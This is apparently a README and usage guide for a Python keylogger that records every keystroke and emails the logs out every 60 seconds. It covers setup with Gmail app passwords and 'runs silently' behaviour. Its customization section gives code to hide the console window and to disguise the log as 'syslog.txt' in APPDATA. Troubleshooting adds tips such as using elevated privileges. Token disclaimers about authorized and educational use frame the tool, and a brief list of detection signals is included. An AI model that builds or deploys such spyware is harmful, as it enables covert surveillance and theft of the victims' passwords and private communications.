# PythonKeylogger

Simple Python keylogger that captures all keystrokes, saves to local text file, and emails logs every 60 seconds.

Features
Captures letters, numbers, spaces, enters, special keys
Saves to keylog.txt every minute
Emails identical logs every minute
Runs silently in background
Timestamped entries


# Keylogger - Usage Guide

## ⚠️ AUTHORIZED USE ONLY
- Tool for authorized penetration testing and education purposes only

## • SETUP
- `pip install pynput`
- Edit 4 config variables at top of `keylogger.py`:
  * `EMAIL_TO`: Log destination
  * `EMAIL_FROM`: SMTP sender
  * `EMAIL_PASS`: SMTP credential
  * `LOG_FILE`: Local storage path

## • GMAIL AUTHENTICATION
- Enable 2FA on account
- Generate 16-character App Password
- Use App Password (not regular password)

## • EXECUTION
```
python keylogger.py
```

## • BEHAVIOR
- Immediate keystroke capture
- File + email delivery every 60 seconds
- Runs persistently until terminated
- Minimal system footprint

## • OUTPUT
- **Local**: `LOG_FILE` path
- **Remote**: `EMAIL_TO` inbox

## • LOG FORMAT
```
raw keystrokes
[special keys bracketed]
============================= HH:MM:SS =============================
timestamp separator
```

## • CUSTOMIZATION
```
LOG_FILE = os.path.join(os.environ['APPDATA'], 'syslog.txt')

# Hide console (Windows)
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Faster reporting
time.sleep(30)  # 30s intervals
```

## • COMPATIBILITY
- ✅ **Windows**: Full support
- ⚠️ **Linux/macOS**: Keyboard capture only

## • TROUBLESHOOTING
```
FILE ACCESS:
• Use TEMP/APPDATA directories
• Verify write permissions

EMAIL FAILURES:
• Check App Password format
• Verify port 587 connectivity
• Monitor spam folders

NO CAPTURE:
• Disable keyboard hook conflicts
• Try elevated privileges
```

## • DETECTION NOTES
- File location patterns
- Periodic SMTP traffic
- Keyboard hook signatures
- Process visibility

## • BEST PRACTICES
- Document authorization
- Define scope boundaries
- Plan cleanup procedures
- Schedule reporting

**EDUCATIONAL PURPOSES ONLY**
